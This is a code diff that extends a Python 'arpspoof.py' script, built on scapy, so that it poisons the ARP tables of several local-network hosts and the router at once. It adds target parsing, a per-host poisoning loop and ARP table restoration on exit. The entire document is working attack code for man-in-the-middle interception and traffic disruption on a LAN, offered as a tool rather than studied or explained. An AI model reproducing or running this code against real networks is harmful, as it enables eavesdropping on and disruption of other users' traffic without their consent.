@@ -21,7 +21,7 @@ from os import popen
 from argparse import ArgumentParser
 
 def fgetmac(ip):
-	popen('ping %s -c 2 -i 0.5' % ip).read()
+	popen('ping %s -c 1' % ip).read()
 	return popen("arp -a | grep '(%s)' | cut -d 't' -f 2 | cut -d ' ' -f 2" %(ip)).read().strip()
 
 def fownmac():
@@ -29,15 +29,19 @@ def fownmac():
 	return ifaddresses(def_gw_device)[AF_LINK][0]['addr']
 
 def ffix():
-	resettarget=ARP(op=1,psrc=routerip,pdst=targetip,hwdst=targetmac, hwsrc=routermac)
-	resetrouter=ARP(op=2,psrc=targetip,pdst=routerip,hwdst=routermac, hwsrc=targetmac)
-	send(resetrouter, count=4, verbose=False)
-	send(resettarget, count=4, verbose=False)
+	for target in targetlist:
+		targetip = target[0]
+		targetmac = target[1]
+		resettarget=ARP(op=1,psrc=routerip,pdst=targetip,hwdst=targetmac, hwsrc=routermac)
+		resetrouter=ARP(op=2,psrc=targetip,pdst=routerip,hwdst=routermac, hwsrc=targetmac)
+		send(resetrouter, count=4, verbose=False)
+		send(resettarget, count=4, verbose=False)
+		print ' [*] Fixed ARP tables for %s' % targetip
 	if not args.mac:
 		popen("echo 0 > /proc/sys/net/ipv4/ip_forward").read()
 
 parser = ArgumentParser(prog='arpspoof', usage='./arpspoof.py [options]')
-parser.add_argument('-t', "--targetip", type=str, help='Last digit of IP eg. 213')
+parser.add_argument('-t', "--targets", type=str, help='Target IP extensions eg. 13,215,23')
 parser.add_argument('-m', "--mac", type=str, help='Spoof to user defined MAC.')
 parser.add_argument('-r', "--replies", action="store_true", help='Use ARP replies instead of requests.')
 parser.add_argument('-n', "--norouter", action="store_true", help='Only poison the target, not the router.')
@@ -56,15 +60,23 @@ routerip = gateways()['default'].values()[0][0]
 network = '.'.join(routerip.split('.')[:3])
 
 try:
-	targetip = network + '.' + args.targetip
+	targets = args.targets.split(',')
 except:
 	parser.print_help()
 	exit()
 
 routermac = fgetmac(routerip)
 print " [*] Detected router: %s (%s)" % (routerip, routermac)
-targetmac = fgetmac(targetip)
-print " [*] Detected target: %s (%s)" % (targetip, targetmac)
+
+targetlist = []
+for target in targets:
+	targetip = network + '.' + target
+	targetmac = fgetmac(targetip)
+	if len(targetmac) == 17:
+		print " [*] Detected target: %s (%s)" % (targetip, targetmac)
+		targetlist.append([targetip, targetmac])
+	else:
+		print ' [X] Error: No MAC for %s found, skipping' % (targetip)
 
 if args.replies:
 	targetop = 2
@@ -73,19 +85,21 @@ else:
 	targetop = 1
 	print " [*] Using ARP requests."
 
-poisontarget=ARP(op=targetop,psrc=routerip,pdst=targetip,hwdst=targetmac, hwsrc=spoofmac)
-poisonrouter=ARP(op=2,psrc=targetip,pdst=routerip,hwdst=routermac, hwsrc=spoofmac)
-
 print " [*] Spoofing to: %s%s" % (spoofmac, ismitm)
 print " [*] Attacking."
 
 try:
 	while True:
-		if args.norouter:
-			send(poisontarget, verbose=False)
-		else:
-			send(poisonrouter, verbose=False)
-			send(poisontarget, verbose=False)
+		for target in targetlist:
+			targetip = target[0]
+			targetmac = target[1]
+			poisontarget=ARP(op=targetop,psrc=routerip,pdst=targetip,hwdst=targetmac, hwsrc=spoofmac)
+			poisonrouter=ARP(op=2,psrc=targetip,pdst=routerip,hwdst=routermac, hwsrc=spoofmac)
+			if args.norouter:
+				send(poisontarget, verbose=False)
+			else:
+				send(poisonrouter, verbose=False)
+				send(poisontarget, verbose=False)
 
 		sleep(1.5)
 
